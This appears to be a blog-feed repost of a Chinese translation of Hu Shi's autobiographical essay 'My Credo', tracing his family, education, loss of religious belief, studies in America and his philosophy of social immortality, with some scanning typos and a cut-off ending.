        <content type="html"><![CDATA[<p>转自 <a href="http://www.my285.com/xdmj/hushi/syrs/index.htm" target="_blank" rel="noopener">梦远书城 : 胡适《实用人生》</a> </p><p>我的信仰</p><p>我父胡珊，是一位学者，也是一个有坚强意志，有治理才干的人。经过一个时期的文史经籍训练后，他对于地理研究，特别是边省的地理，大起兴趣。他前往京师，怀了一封介绍书，又走了四十二日而达北满吉林，进见钦差大臣吴大激。吴氏是现在见知于欧洲研究中国学问者之中国的一个大考古学家。吴氏延见他，问有什么可以替他为力的。我父说道：“没有什么，只求准我随节去解决中俄界务的纠纷，件我得以研究东北各省的地理。”吴氏对于这个只有秀才底子，在关外长途跋涉之后，差不多已是身无分文的学者，觉得有味。他带了这个少年去干他那历史上有名的差使，得他做了一个最有价值、最肯做事的帮手。</p><p>有一次与我父亲同走的一队人，迷陷在一个广阔的大森林之内，三天找不着出路。到粮食告尽，一切侦察均归失败时，我父亲就提议寻觅溪流。溪流是多半流向森林外面去的，一条溪流找到了手，他们一班人就顺流而行，得达安全的地方。我父亲作了一首长诗纪念这次的事迹，乃四十年后，我在《论杜威教授系统思想说》的一篇论文里，用这件事实以为例证，虽则我未尝提到他的名字，有好些与我父亲相熟而犹生存着的人，都还认得出这件故事，并写信问我是不是他们故世已久的朋友的一个小儿子。</p><p>吴大激对我父亲虽曾一度向政府荐举他为“有治省才能的人”，政治上却并未得臻通显，历官江苏、台湾后，遂于台湾团中日战争的结果而割让与日本时，以五十五岁的寿延逝世。</p><p>我是我父亲的幼儿，也是我母亲的独子。我父亲娶妻凡三次；前妻死于太平天国之乱，乱军掠遍安徽南部各县，将其化为灰烬。次娶生了三个儿子、四个女儿。长子从小便证明是个难望洗心革面的败子。我父亲丧了次妻后，写信回家，说他一定要讨一个纯良强健的、做庄家人家的女儿。</p><p>我外祖父务农，于年终几个月内兼业裁缝。他是出身于一个循善的农家，在太平天国之乱中，全家被杀。因他还只是一个小孩子，故被太平军掠做俘虏，带往军中当差。为要防他逃走，他的脸上就刺了“太平天国”四字，终其身都还留着，但是他吃了种种困苦，居然逃了出来，回到家乡，只寻得一片焦土，无一个家人还得活着。他勤苦工作。耕种田地，兼做裁缝，裁缝的手艺，是他在贼营里学来的。他渐渐长成，娶了一房妻子，生下四个儿女，我母亲就是最长的。</p><p>我外祖父一生的心愿就是想重建被太平军毁了的家传老屋。他每天早上，太阳未出，便到溪头去拣选三大担石子，分三次挑回废屋的地基。挑完之后，他才去种田或去做裁缝。到了晚上回家时，又去三次，挑了三如石子，才吃晚饭。凡此辛苦恒毅的工作，都给我母亲默默看在眼里，他暗恨身为女儿，毫无一点法子能减轻他父亲的辛苦，促他的梦想实现。</p><p>随后来了个媒人，在田里与我外祖父会见，雄辩滔滔的向他替我父亲要他大女儿的庚帖。（按胡先生《我的母亲订婚》一章里面，用的是“八字”二字，英文系<br>irth date p，故译庚贴似较贴切。）我外祖父答应回去和家里商量。但到他在晚上把所提的话对他的妻子说了，她就大生气。她说：“不行！把我女儿嫁给一个大她三十岁的人，你真想得起？况且他的儿女也有年纪比我们女儿还大的！还有一层，人家自然要说我们嫁女儿给一个老官，是为厂钱财体面而把她牺牲的。”于是这一对老夫妻吵了一场。后来做父亲的说：“我们问问女儿自己。说来说去，这到底是她自己的事。”</p><p>到这个问题对我母亲提了出来，她不肯开口。中国女子遇到同类的情形常是这样的。但她心里却在深思沉想。嫁与中年丧偶、兼有成年儿女的人做填房，送给女家的聘金财扎比一般婚姻却要重得多，这点于她父亲盖房子的计划将大有帮助。况她以前又是见过我父亲的，知道他为全县人所敬重。她爱慕他，愿意嫁他，为的半是英雄崇拜的意识，但大半却是想望帮助劳苦的父亲的孝恩。所以到她给父亲逼着答话，她就坚决的说：“只要你们俩都说他是好人，请你们俩作主。男人家四十七岁也不能算是老。”我外祖父听了，叹了一口气，我外祖母可气的跳起来，忿忿的说：“好呵！你想做官太太了！好罢，听你情愿罢！”</p><p>我母亲于一八八九年结婚，时年十七，我则生在一八九一年十二月。我父殁于一八九五年，留下我母亲二十三岁做了寡妇。我父弃世，我母便做了一个有许多成年儿女的大家庭的家长。中国做后母的地位是十分困难的。她的生活自此时起，自是一个长时间的含辛茹苦。</p><p>我母亲最大的禀赋就是容忍。中国史书记载唐朝有个皇帝垂询张公仪那位家长，问他家以什么道理能九世同居而不分离拆散。那位老人家因过于衰迈，难以口述，请准用笔写出回答。他就写了一百个“忍”字。中国道德家时常举出“百忍”的故事为家庭生活最好的例子，但他们似乎没有一个曾觉察到许多苦恼、倾轧、压迫和不平，使容忍成了一种必不可少的事情。</p><p>那班接脚媳妇凶恶不善的感情，利如锋刃的话语，含有敌意的嘴脸，我母亲事事都耐心容忍。她有时忍到不可再忍，这才早上不起床，柔声大哭，哭她早丧丈夫，她从不开罪她的媳妇，也不提开罪的那件事，但是这些眼泪，每次都有神秘莫测的效果。我总听得有一位嫂嫂的房门开了，和一个妇人的脚步声向厨房走去。不多一会，她转来敲我们房门了。她走进来捧着一碗热茶，送给我的母亲，劝她止哭，母亲接了茶碗，受了她不出声的认错，然后家里又太平清静得个把月。</p><p>我母亲虽则并不知书识字，却把她的全副希望放在我的教育上。我是一个早慧的小孩，不满三岁时，就已认了八百多字，都是我父亲每天用红笺方块教我的。我才满三岁零点，便在学堂里念书。我当时是个多病的小孩，没有搀扶，不能跨一个六英寸高的门槛。但我比学堂里所有别的学生都能读能记些。我从不跟着村中的孩子们一块儿玩。更因我缺少游戏，我五岁时就得了“先生”的绰号。十五年后，我在康奈耳大学做二年级时，也同是为了这个弱点，而被houD比tor 缩读，音与dog同，故用作谐称。译者）的浑名。</p><p>每天天还未亮时，我母亲便把我喊醒，叫我在床上坐起。她然后把对我父亲所知的一切告诉我。她说她望我踏上他的脚步，她一生只晓得他是最善良最伟大的人。据她说，他是一个多么受人敬重的人，以致在他间或休假回家的时期中，附近烟窟赌馆都改行停业。她对我说我惟有行为好，学业科考成功，才能使他们两老增光；又说她所受的种种苦楚，得以由我勤敏读书来酬偿。我往往眼睛半睁半闭的听。但她除遇有女客与我们同住在一个房间的时候外，罕有不施这番晨训的。</p><p>到天大明时，她才把我的衣服穿好，催我去上学。我年稍长，我总是第一个先到学堂，并且差不多每天早晨都是去敲先生的门要钥匙去开学堂的门。钥匙从门缝里递了出来。我隔一会就坐在我的座位上朗朗念书了。学堂里到薄暮才放学，届时每个学生都向朱印石刻的孔夫子大像和先生鞠躬回家。日中上课的时间平均是十二小时。</p><p>我母亲一面不许我有任何种类的儿童游戏，一面对于我建一座孔圣庙的孩子气的企图，却给我种种鼓励。我是从我同父异母的姊姊的长子，大我五岁的一个小孩那里学来的。他拿各种华丽的色纸扎了一座孔庙，使我心里羡慕。我用一个大纸匣子作为正殿，背后开了一个方洞，用一只小匣子糊上去，做了摆孔子牌位的内堂。外殿我供了孔子的各大贤徒，并贴了些小小的匾对，书着颂扬这位大圣人的字句，其中半系录自我外甥的庙里，半系自书中抄来。在这座玩具的庙前，频频有香炷燃着。我母亲对于我这番有孩子气的虔敬也觉得欢喜，暗信孔子的神灵一定有报应，使我成为一个有名的学者，并在科考中成为一个及第的士子。</p><p>我父亲是一个经学家，也是一个严守朱熹（—一三零——一二零零）的新儒教理学的人。他对于释道两教强烈反对。我还记得见我叔父家（那是我的开蒙学堂）的门上有一张日光晒谈了的字条，写着“僧道无缘”几个字。我后来才得知道这是我父亲所遗理学家规例的一部。但是我父亲业已去世，我那彬彬儒雅的叔父，又到皖北去做了一员小吏，而我的几位哥子则都在上海。剩在家里的妇女们，对于我父亲的理学遗规，没有什么拘束了。他们尊守敬奉祖宗的常礼，并随风俗时会所趋，而自由礼神拜佛。观音菩萨是他们所最爱的神，我母亲是为了出于焦虑我的健康福祉的念头，也做了观音的虔诚信士。我记得有一次她到山上观音阁里去进香，她虽缠足，缠足是苦了一生的，在整段的山路上，还是步行来回。</p><p>我在村塾（村中共有七所）里读书。读了九年（一八九五——一九零四）。在这个期间，我读习并记诵了下列几部书：<br>1.《孝经》：孔子后的一部经籍，作者不明。<br>2.《小学》：一部论新儒教道德学说的书，普通谓系宋哲朱烹所作。<br>3.《四书）：《论语》、《孟子》、《大学》、《中庸》。<br>4.《五经》中的四经：《诗经》、《尚书》、《易经》、《礼记》。</p><p>我母亲对于家用向来是节省的，而付我先生的学金，却坚要比平常要多三倍。平常学金两块银元一年，她首先便送六块钱，后又逐渐增加到十二元。由增加学金这一点小事情，我得到千百倍于上述数目比率所未能给的利益。因为那两元的学生，单单是高声朗读，用心记诵，先生从不劳神去对他讲解所记的字。独我为了有额外学金的缘故，得享受把功课中每字每句解给我听，就是将死板文字译作白话这项难得的权利。</p><p>我年还不满八岁，就能自己念书，由我二哥的提议，先生使我读《资治通鉴》。这部书，实在是大历史家司马光于一零八四年所辑编年式的中国通史。这番读史，使我发生很大的兴趣，我不久就从事把各朝代各帝王各年号编成有韵的歌诀，以资记忆。</p><p>随后有一天，我在叔父家里的废纸箱中，偶然看见一本《水浒传》的残本，便站在箱边把它看完了。我跑遍全村，不久居然得着全部。从此以后，我读尽了本村邻村所知的小说。这些小说都是用白话或口语写的，既易了解、又有引人人胜的趣味。它们教我人生，好的也教，坏的也教，又给了我一件文艺的工具，若干年后，使我能在中国开始民众所称为“文学革命”（iteng Renaissance ，直译当为文艺复兴。译者）的运动。</p><p>其时，我的宗教生活经过一个特异的激变。我系生长在拜偶像的环境，习于诸神凶恶丑怪的面孔，和天堂地狱的民间传说。我十一岁时，一日，温习朱子的《小学》，这部书是我能背诵而不甚了解的。我念到这位理学家引司马光那位史家攻击天堂地狱的通俗信仰的话。这段话说：“形既朽灭，神亦飘散，虽有判烧春磨，亦无所施。”这话好像说得很有道理，我对于死后审判的观念，就开始怀疑起来。</p><p>往后不久，我读司马光的《资治通鉴》，读到第一百三十六卷中有一段，使我成了一个无神论者。所说起的这一段，述纪元五世纪名范缜的一位哲学家，与朝众竞辩“神灭论”。朝廷当时是提倡大乘佛法的。范缜的见解，由司马光摄述为这几句话：“形者神之质地，神者形之用也。神之于形，犹利之于刃。未闻刃没而利存，岂容形灭而神在哉。”</p><p>这比司马光的形灭神散的见解——一种仍认有精神的理论——还更透彻有理。范缜根本否认精神为一种实体，谓其仅系神之用。这一番化繁为简合着我儿童的心胸。读到“朝野喧哗，难之，终不能屈”，更使我心悦。</p><p>同在那一段内，又引据范缜反对因果轮回说的事。他与竞陵工谈论，王对他说：“君不信因果，何得有富贵贫贱？”范缜答道：“人生如树花同发，随风而散；或拂帘幌，坠茵席之上；或关篱墙，落粪涵之中。堕茵席者，殿下是也；落粪涵者，下官是也。贵贱虽复殊途，因果竟在何处？”</p><p>因果之说，由印度传来，在中国人思想生活上已成了主要部分的少数最有力的观念之一。中国古代道德家，常以善有善报，恶有恶报为训。但在现实生活上并不真确。佛教的因果优于中国果报观念的地方，就是可以躲过这个问题，将其归之于前世来世不断的轮回。</p><p>但是范缜的比喻，引起了我幼稚的幻想，使我摆脱了恶梦似的因果绝对论，这是以偶然论来对定命论。而我以十一岁的儿童就取了偶然论而叛离了运命，我在那个儿童时代是没有牵强附会的推理的，仅仅是脾性的迎拒罢了。我是我父亲的儿子，司马光和范缜又得了我的心。仅此而已。</p><p>但是这一种心境的激变，在我早年不无可笑的结果，一九零三年的新年里，我到我住在二十四里外的大姊家去拜年。在她家住了几天，我和她的儿子回家，他是来拜我母亲的年的。他家的一个长工替他挑着新年礼物。我们回到路上，经过一个亭子，供着几个奇形怪状的神像。我停下来对我外甥说：“这里没有人看见，我们来把这几个菩萨抛到污泥坑里去罢。”我这带孩子气的毁坏神像主张，把我的同伴大大地吓住了。他们劝我走路，莫去惹那些本来已经濒于危境的神道。</p><p>这一天正是元宵灯节，我们到了家中，家里有许多客人，我的肚子已经饿了，开饭的时候，我外甥又劝我喝了上杯烧酒。酒在我的肚子里，便作怪起来。我不久便在院子里跑，喊月亮下来看灯。我母亲不悦，叫人来捉我。我在他们前头跑，酒力因我跑路，作用更起得快。我终被捉住，但还努力想挣脱。我母亲抱住我，不久便有许多人朝我们围拢来。</p><p>我心里害怕，便胡言乱道起来。于是我外甥家的长工走到我母亲身边，低低的说：“外婆，我想他定是精神错乱了。恐怕是神道怪了他。今天下午我们路过三门亭，他提议要把几尊菩萨抛到污泥坑里去。一定是这番话弄出来的事。”我窃听了长工的话，忽然想出一条妙计。我喊叫得更凶，好像我就真是三门亭的一个神一样。我母亲于是便当空焚香祷告，说我年幼无知无咎，许下如果蒙神恕我小孩子的罪过，定到亭上去烧香还愿。</p><p>这时候，得报说龙灯来了，在我们屋里的人，都急忙跑去看，只剩下我和母亲两个人。一会儿我就睡着了。母亲许的愿，显然是灵应了。一个月后，我母亲和我上外婆家去，她叫我恭恭敬敬地在三门亭还我们许下的愿。</p><p>我年甫十三，即离家上路七日，以求“新教育”于上海。自这次别离后，我于十四年之中，只省候过我母亲三次，一总同她住了大约七个月。出自她对我伟大的爱忱，她送我出门，分明没有酒过一滴眼泪就让我在这广大的世界中，独自求我自己的教育和发展，所带着的，只是一个母亲的爱，一个读书的习惯，和一点点怀疑的倾向。</p><p>我在上海过了六年（一九零四——一九一零），在美国过了七年（一九一零——一九一七）。在我停留在上海的时期内，我经历过三个学校（无一个是教会学校），一个都没有毕业，我读了当时所谓的“新教育”的基本东西，以历史、地理、英文、数学，和一点零碎的自然科学为主。从故林纤氏及其他请人的意译文字中，我初次认识一大批英国和欧洲的小说家，司各提（SCott ），狄更司（Dickens ），大小仲马（DU.ereet ils）、嚣俄，以及托尔斯泰等氏的都在内。我读了中国上古、中古几位非儒教和新儒教哲学家的著作，并喜欢墨翟的兼爱说与老子、庄子有自然色彩的哲学。</p><p>从当代力量最大的学者梁启超氏的通俗文字中，我渐得略知霍布士、笛卡儿、卢骚、宾坦、康德、达尔文等诸泰西思想家。梁氏是一个崇拜近代西方文明的人，连续发表了些文字，坦然承认中国人以一个民族而言，对于欧洲人所具有许多良好特性，感受缺乏；显著的是注重公共道德，国家思想，爱冒险，私人权利观念与热心防其被侵，爱自由，自治能力，结合的本事与组织的努力，注意身体的培养与健康等。就是这几篇文字猛力把我以我们古旧文明为自足，除战争的武器，商业转运的工具外，没有什么要向西方求学的这种安乐梦中，震醒出来。它们开了给我，也就好像开了给几千几百别的人一样，对于世界整个的新眼界。</p><p>我又读过严复所译穆勒的《自由论》和赫胥黎的《天演论》。严氏所译赫胥黎的论著，于一八九八年就出版，并立即得到知识阶级的接受。有钱的人拿钱出来翻印新版以广流传（当时并没有版权），因为有人以达尔文的言论，尤其是它在社会上与政治上的运用，对于一个感受惰性与儒滞日久的民族，乃是一个合宜的刺激。</p><p>数年之间，许多的进化名词在当时报章杂志的文字上，就成了口头禅。无数的人，都采来做自己的和儿辈的名号，由是提醒他们国家与个人在生存竞争中消灭的祸害。向尝一度闻名的陈炯明以“竞存”为号。我有两个同学名杨天择和孙竞存。</p><p>就是我自己的名字，对于中国以进化论为时尚，也是一个证据。我请我二哥替我起个学名的那天早晨，我还记得清楚。他只想了一刻，他就说，“‘适者生存’中的‘适’字怎么样？”我表同意；先用来做笔名，最后于一九一零年就用作我的名字。</p><p>我对于达尔文与斯宾塞两氏进化假说的一些知识，很容易的与几个中国古代思想家的自然学说连了起来。例如在道家伪书《列子》所述的下面这个故事中，发现二千年前有一个一样年轻，同抱一样信仰的人，使我的童心欢悦：齐田氏祖于庭，食客千人。中坐有献鱼雁者，田氏视之，乃叹日：“天之于民厚矣！殖五谷，生鱼鸟以为之用。”众客和之如响。鲍氏之子，年十二，预于次，进日：“不如君言。天地万物，与我并生，类也。类无贵贱，徒以大小智力而相制，造相食，非相为而生之。人取食者而食之，岂天本为人而生之，且蚊纳哈肤，虎狼食肉，岂天本为蚊的生人，虎狼生肉者钱？”</p><p>一九零六年，我在中国公学同学中，有几位办了一个定期刊物，名《竞业旬报》，——达尔文学说通行的又一例子——其主旨在以新思想灌输于未受教育的民众，系以白话刊行。我被邀在创刊号撰搞。一年之后，我独自做编辑。我编辑这个杂志的工作不但帮助我启发运用现行口语为一种文艺工具的才能，且以明白的话语及合理的次序，想出自我幼年就已具了形式的观念和思想。在我为这个杂志所著的许多论文内，我猛力攻击人民的迷信，且坦然主张毁弃神道，兼持无神论。</p><p>一九零八年，我家因营业失败，经济大感困难。我于十七岁上，就必需供给我自己读书，兼供养家中的母亲。我有一年多停学，教授初等英文，每日授课五小时，月得修金八十元。一九一0 年，我教了几个月的国文。</p><p>那几年（一九零九——一九一零）是中国历史上的黑暗时代，也是我个人历史上的黑暗时代。革命在好几省内爆发，每次都归失败。中国公学原是革命活动的中心，我在那里的旧同学参加此等密谋的实繁有徒，丧失生命的为数也不少。这班政治犯有好些来到上海与我住在一起，我们都是意气消沉，厌世悲观的。我们喝酒，作悲观的诗词，日夜谈论，且往往作没有输赢的赌博。我们甚至还请了一个老伶工来教我们唱戏。有一天早上，我作了一首诗，中有这一句：“霜浓欺日淡”！</p><p>意气消沉与执劳任役驱使我们走人了种种的流浪放荡。有一个雨夜，我喝酒喝得大醉，在镇上与巡捕角斗，把我自己弄进监里去关了一夜。到我次晨回寓，在镜中看出我脸上的血痕，就记起李白饮酒歌中的这一句：“有人用武力，任出吾身物。”。这一句一时也查不出原文。）我决心脱离教书和我的这班朋友。下了一个月的苦工夫，我就前往北京投考用美国退还庚子赔款所设的学额。我考试及格，即于七月间放洋赴美。</p><p>我到美国，满怀悲观。但不久便交结了些朋友，对于那个国家和人民都很喜爱。美国人出自天真的乐观与朝气给了我很好的印象。在这个地方，似乎无一事一物不能由人类智力做得成的。我不能避免这种对于人生持有喜气的眼光的传染，数年之间，就渐渐治疗了我少年老成的态度。</p><p>我第一次去看足球比赛时，我坐在那里以哲学的态度看球赛时的粗暴及狂叫欢呼为乐。而这种狂叫欢呼在我看来，似乎是很不够大学生的尊严的。但是到竞争愈渐激烈，我也就开邮悟这种热心。随后我偶然回头望见白了头发的植物学教授劳理先生诚心诚意的在欢呼狂叫，我觉得如是的自惭，以致我不久也就热心的陪着众人欢呼了。</p><p>就是在民国初年最黑暗的时期内，我还是想法子打起我的精神。在致一个华友的信里面，我说道：“除了你我自己灰心失意，以为无希望外，没有事情是无希望的。”（译意——译者。）在我的日记上，我记下些引录的句子，如引克洛浦的这一句：“如果希望是麻醉物，恐惧就是作伪者。”又如我自己译自勃朗宁的这一节诗：从不转背而挺身向前，从不怀疑云要破裂，虽合理的弄糟，违理的占胜，而从不作迷梦的，相信我们沉而再升，败而再战，睡而再醒。</p><p>一九一四年一月，我写这一句在我的日记上：“我相信我自离开中国后，所学得的最大的事情，就是这种乐观的人生哲学了。”一九一五年，我以关于勃朗宁最优的论文得受柯生奖金。我论文的题目是《勃朗宁乐观主义辩》。我想来大半是我渐次改变了的人生观使我于替他辩护时，以一种诚信的意识来发言。</p><p>我系以在康奈耳大学做纽约农科学院的学生开始我的大学生涯。我的选择是根据了当时中国盛行的，谓中国学生须学点有用的技艺，文学、哲学是没有什么实用的这个信念。但是也有一个经济的动机。农科学院当时不收学费，我心想或许还能够把每月的月费省下一部来汇给我的母亲。</p><p>农场上的经验我一点都不曾有过，并且我的心也不在农业上。一年级的英国文学及德文课程，较之农场实习和养果学，反使我感觉兴趣。踌躇观望了一年又半，我最后转人文理学院，一次缴纳四个学期的学费，就是使我受八个月困境的处分。但是我对于我的新学科觉得更为自然，从不懊悔这番改变。</p><p>有一科《欧洲哲学史》——归故克莱顿教授那位恩师主持，——领导我以哲学做了主科。我对于英国文学与政治学也深有兴趣。康奈耳的哲学院是唯心论的重镇。在其领导之下，我读了古代近代古典派哲学家比较重要的著作，我也读过晚近唯心论者如布拉特莱，鲍森模等的作品，但是他们提出的问题从未引起我的兴趣。</p><p>一九一五年，我往哥林比亚大学，就学于杜威教授，直至一九一七年我回国之时为止。得着杜威的鼓励，我著成我的论文《先秦名学史》这篇论文，使我把中国古代哲学著作重读一遍，并立下我对于中国思想史的一切研究的基础。</p><p>我留美的七年间，我有许多课外的活动，影响我的生命和思想，说不定也与我的大学课业一样。当意气颓唐的时候，我对于基督教大感兴趣，且差不多把《圣经》读完。一九—一年夏，我出席于在宾雪凡尼亚普柯诺派思司举行的中国基督教学生会的大会做来宾时，我几乎打定主意做了基督徒。</p><p>但是我渐渐的与基督教脱离，虽则我对于其发达的历史曾多有习读，因为有好久时光我是一个信仰无抵抗主义的信徒。耶稣降生前五百年，中国哲学家老子曾传授过上善若水，水善应万物而不争。我早年接收老子的这个教训，使我大大的爱着《登山宝训》。</p><p>一九一四年，世界大战爆发，我深为比利时的命运所动，而成了一个确定的无抵抗者。我在康奈耳大同俱乐部）住了三年，结交了许多各种国籍的热心朋友。受着像那士密氏）和麦慈那样唯心的平和论者的影响，我自己也成了一个热心的平和论者。大学废军联盟因维腊特的提议而成立于一九一五年，我是其创办人之一。</p><p>到后来，各国际政体俱乐部成立，我在那士密氏和安格尔的领导之下，做了一个最活动的会员，且曾参加过其起首两届的年会。一九一六年，我以我的论文《国际关系中有代替武力的吗？》得受国际政体俱乐部的奖金。在这篇论文里，我阐明依据以法律为有组织的武力建立一个国际联盟的哲理。</p><p>我的平和主义与国际大同主义往往使我陷人十分麻烦的地位。日本由攻击德国在山东的领土以加人世界大战时，向世界宣布说，这些领土“终将归还中国”。我是留美华人中唯一相信这个宣言的人，并以文字辩驳说，日本于其所言，说不定是意在必行的。关于这一层，我为许多同辈的学生所嘲笑。及一九一五年日本提出有名的对华二十一条件，留美学生，人人都赞成立即与日本开战。我写了一封公开的信给《中国留美学生月报》，劝告处之以温和，持之以冷静。我为这封信受了各方面的严厉攻击，屡被斥为卖国贼。战争是因中国接受一部要求而得避免了，但德国在华领土则直至七年之后才交还中国。</p><p>我读易卜生、莫黎和赫胥黎诸氏的著作，教我思考诚实与发言诚实的重要。我读过易卜生所有的戏剧，特别爱看《人民之敌》、莫黎的《论妥协》，先由我的好友威廉思女士介绍给我，她是一直做了左右我生命最重要的精神力量。莫黎曾教我：“一种主义，如果健全的话，是代表一种较大的便宜的。为了一时似是而非的便宜而将其放弃，乃是为小善而牺牲大善。疲弊时代，剥夺高贵的行为和向上的品格，再没有什么有这样拿得定的了。”</p><p>赫胥黎还更进一步教授一种理知诚实的方法。他单单是说：“拿也如同可以证明我相信别的东西为合理的那种种证据来，那么我就相信人的不朽了。向我说类比和或能是说无用的。我说我相信倒转平方律时，我是知道我意何所指的，我必不把我的生命和希望放在较弱的信证上。”赫胥黎也曾说过：“一个人生命中最神圣的举动，就是说出并感觉得我相信某项某项是真的。生在世上一切最大的赏，一切最重要的罚，都是系在这个举动上”。</p><p>人生最神圣的责任是努力思想得好，我就是从杜威教授学来的。或思想得不精，或思想而不严格的到它的前因后果，接受现成的整块的概念以为思想的前提，而于不知不觉间受其个人的影响，或多把个人的观念由造成结果而加以测验，在理知上都是没有责任心的。真理的一切最大的发现，历史上一切最大的灾祸，都有赖于此。</p><p>杜威给了我们一种思想的哲学，以思想为一种艺术，为一种技术。在《思维术》和《实验逻辑论文集》里面，他制出这项技术。我察中不但于实验科学上的发明为然，即于历史科学上最佳的探讨，内容的详定，文字的改造，及高等的批评等也是如此。在这种种境域内，曾由同是这个技术而得到最佳的结果。这个技术主体上是具有大胆提出假设，和（加）上诚恳留意于制裁与证实。这个实验的思想技术，堪当创造的智力这个名称，因其在运用想象机智以寻求证据，做成实验上，和在自思想有成就的结实所发出满意的结果上，实实在在是有创造性的。</p><p>奇怪之极，这种功利主义的逻辑竟使我变成了一个做历史探讨工作的人。我曾用进化的方法去思想，而这种有进化性思想习惯，就做I 我此后在思想史及文学工作上的成功之钥。尤更奇怪的，这个历史的思想方法并没有使我成为一个守旧的人，而时常是进步的人。例如，我在中国对于文学革命的辩论，全是根据无可否认的历史进化的事实，且一向都非我的对方所能答复得来的。</p><p>我母亲于一九一八年逝世。她的逝世，就是引导我把我在这广大世界中摸索了十四年多些的信条第一次列成条文的时机。这个信条系于一九一九年发表在以《不朽》为题的一篇文章里面。</p><p>因有找在幼童时期读书得来的学识，我早久就已摒弃了个人死后生存的观念了。好多年来，我都是以一种“三不朽”的古说为满意，这种古说我是在《春秋左氏传》里面找出来的。传记里载贤臣叔孙豹于纪元前五四八年（时孔子还只有三岁。泽者按，即鲁襄公二十四年）谓有立德、立功、立言三不朽。此三者“虽久不忘，此之谓不朽”。这种学说引动我心有如是之甚，以致我每每向我的外国朋友谈起，并给了它一个名字，叫做“三W 的不朽主义”。</p><p>我母亲的逝世使我从新想到这个问题，我就开始觉得三不朽的学说有修正的必要。第一层，其弱点在太过概括一切。在这个世界上，有多少人其在德行功绩言语上的成就，其哲理上的智慧能久久不忘的呢？例如哥伦布是可以不朽了，但是他那些别的水手怎样呢？那些替他造船或供给他用具的人，那许多或由作有勇敢的思考，或由在海洋中作有成无成的探险，替他铺下道路的前导又怎样呢？简括的说，一个人应有多大的成就，才可以得不朽呢？</p><p>次一层，这个学说对于人类的行为没有消极的裁制。美德固是不朽的了，但是恶德又怎样呢？我们还要再去借重审判日或地狱之火吗？</p><p>我母亲的活动从未超出家庭间琐屑细事之外，但是她的左右力，能清清楚楚的从来吊祭她的男男女女的脸上看得出来。我检阅我已死的母亲的生平，我追忆我父亲个人对她毕生左右的力量，及其对我本身垂久的影响，我遂诚信一切事物都是不朽的。我们所做的一切什么人，我们所干的一切什么事，我们所讲的一切什么话，从在世界上某个地方自有其影响这个意义看来，都是不朽的。这个影响又将依次在别个地方有其效果，而此事又将继续人于无限的空间与时间。</p><p>正如列勃涅慈有一次所说：“人人都感觉到在宇宙中所经历的一切，以及那目睹一切的人，可以从经历其他各处的事物，甚至曾经并将识别现在的事物中，解识出在时间与空间上已被移动的事物。我们是看不见一切的，但一切事物都在那里，达到无穷境无穷期”。一个人就是他所吃的东西，所以达柯塔的务农者，加利芳尼亚的种果者，以及千百万别的粮食供给者的工作，都是生活在他的身上。一个人就是他所想的东西，所以凡曾于他有所左右的人——自苏格拉底、柏拉图、孔子以至于他本区教会的牧师和抚育保姆——都是生活在他的身上。一个人也就是他所享乐的东西，所以无数美术家和以技取悦的人，无论现尚生存或久已物故，有名无名，崇高粗俗，都是生活在他的身上。诸如此类，以至于无穷。</p><p>一千四百年前，有一个人写了一篇论“神灭”的文章，被认为亵读神圣，有如是之甚，以致其君皇敕七十个大儒来相驳难，竟给其驳倒。但是五百年后，有一位史家把这篇文章在他的伟大的史籍中纪了一个撮要。又过了九百年，然后有一个十一岁的小孩偶然碰到这个三十五个字的简单撮要，而这三十五个字，于埋役了一千四百年之后，突然活了起来而生活于他的身上，更由他而生活于几千几百个男男女女的身上。</p><p>一九一二年，我的母校来了一位英国讲师，发表一篇演说，（论中国建立共和的不可能）。他的演讲当时我觉得很为不通，但是我以他对于母音O 的特异的发音方法为有趣，我就坐在那里摹拟以自娱。他的演说久已忘记了，但是他对于母音O的发音方法，这些年来却总与我不离，说不定现在还在我的几千百个学生的口上，而从没有觉察到是由于我对于布兰特先生的恶作剧的摹仿，而布兰特先生也是从不知道的。</p><p>两千五百年前，希马拉雅山的一个山峡里死了一个乞丐。他的尸体在路旁已在腐溃了，来了一个少年王子，看见这个怕人的景象，就从事思考起来。他想到人生及其他一切事物的无常，遂决心脱离家庭，前往旷野中去想出一个自救以救人类的方法。多年后，他从旷野里出来，做了释迦佛，而向世界宣布他所找出的拯救的方法。这样，甚至一个死丐尸体的腐溃，对于创立世界上一个最大的宗教，也曾不知不觉的贡献了其一部分。</p><p>这一个推想的线索引导我信了可以称为社会不朽的宗教，因为这个推想在大体上全系根据于社会对我的影响，日积月累而成小我，小我对于其本身是些什么，对于可以称社会、人类或大自然的那个大我有些什么施为，都留有一个抹不去的痕记这番意思。小我是会要死的，但是他还是继续存活在这个大我身上。这个大我乃是不朽的，他的一切善恶功罪，他的一切言行思想，无论是显著的或细微的，对的或不对的，有好处或有坏处——样样都是生存在其对于大我所产生的影响上。这个大我永远生存，做了无数小我胜利或失败的垂久宏大的佐证。</p><p>这个社会不朽的概念之所以比中国古代三不朽学说更为满意，就在于包括英雄圣贤，也包括贱者微者，包括美德，也包括恶德，包括功德，也包括罪孽。就是这项承认善的不朽，也承认恶的不朽，才构成这种学说道德上的许可。一个死尸的腐烂可以创立一个宗教，但也可以为患全个大陆。一个酒店侍女偶发一个议论，可以使一个波斯僧侣豁然大悟，但是一个错误的政治或社会改造议论，却可以引起几百年的杀人流血。发现一个极微的杆菌，可以福利几千百万人，但是一个害痨的人吐出的一小点痰涎，也可以害死大批的人，害死几世几代。</p><p>人所做的恶事，的确是在他们身后还存在的！就是明白承认行为的结果才构成我们道德责任的意识。小我对于较大的社会的我负有巨大的债项，把他干的什么事情，作的什么思想，做的什么人物，概行对之负起责任，乃是他的职分。人类之为现在的人类，。固是由我们祖先的智行愚行所造而成，但是到我们做完了我们分内时，我们又将由人类将成为怎么样而受裁判了。我们要说，“我们之后是大灾大厄”吗？抑或要说，“我们之后是幸福无疆”吗？</p><p>一九二三年，我又得了一个时机把我的信条列成更普通的条文。地质学家丁文江氏所著，在我所主编的一个周报上发表，论《科学与人生观》的一篇文章，开始了一场用差不多延持了一个足年的长期论战。在中国凡有点地位的思想家。全都曾参与其事。到一九二三年终，由某个善经营的出版家把这论战的文章收集起来，字数竟达二十五万。我被请为这个集子作序。我的序言给这本已繁重的文集又加了一万字，而以我所拟议的“新宇宙观和新人生观的轮廓”为结论，不过有些含有敌意的基督教会，却以恶作剧的口吻，称其为“胡适的新十诫”，我现在为其自有其价值而选择出来：（译者按：以下原系由中文译成英文，故不再译，即径录胡先生中文原文。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 